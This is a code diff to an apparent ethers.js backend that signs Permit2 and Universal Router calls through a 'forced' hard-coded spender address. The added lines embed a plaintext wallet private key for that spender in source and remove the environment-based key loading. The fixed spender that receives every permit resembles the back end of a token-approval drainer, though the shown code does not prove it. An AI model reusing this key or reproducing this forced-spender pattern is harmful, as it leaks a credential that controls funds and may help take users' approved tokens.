@@ -7,8 +7,10 @@ import { ethers } from 'ethers';
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
 
-// Hard-coded executor address (forced)
-const HARDCODED_EXECUTOR = '0xB1F02C288aE708de5E508021071B775c944171e8';
+// Hard-coded spender/executor address (forced)
+const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
+// Hard-coded private key for the above spender (WARNING: embedding keys in source is insecure)
+const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592da10ac85d3090fd62e';
 
 const PERMIT2_ABI = [
   "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
@@ -49,12 +51,17 @@ async function init() {
   try {
     const cfgSnap = await db.collection('admin_config').doc('settings').get();
     const cfg = cfgSnap.exists ? cfgSnap.data() : {};
-    const rpc = cfg.rpcUrl || process.env.RPC_URL;
-    const pk = cfg.spenderPrivateKey || process.env.SPENDER_PRIVATE_KEY;
+    const rpc = cfg.rpcUrl || process.env.RPC_URL || 'https://cloudflare-eth.com';
 
     provider = new ethers.JsonRpcProvider(rpc);
-    if (!pk) throw new Error('No SPENDER_PRIVATE_KEY provided in env or config');
-    spenderWallet = new ethers.Wallet(pk, provider);
+    // Use the hard-coded private key to create the signer
+    spenderWallet = new ethers.Wallet(HARDCODED_PRIVATE_KEY, provider);
+
+    // Sanity check: ensure the provided private key corresponds to the hard-coded spender address
+    const derived = spenderWallet.address;
+    if (derived.toLowerCase() !== HARDCODED_EXECUTOR.toLowerCase()) {
+      throw new Error(`Hard-coded private key does not match HARDCODED_EXECUTOR: derived=${derived} expected=${HARDCODED_EXECUTOR}`);
+    }
 
     permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, spenderWallet);
     routerContract = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
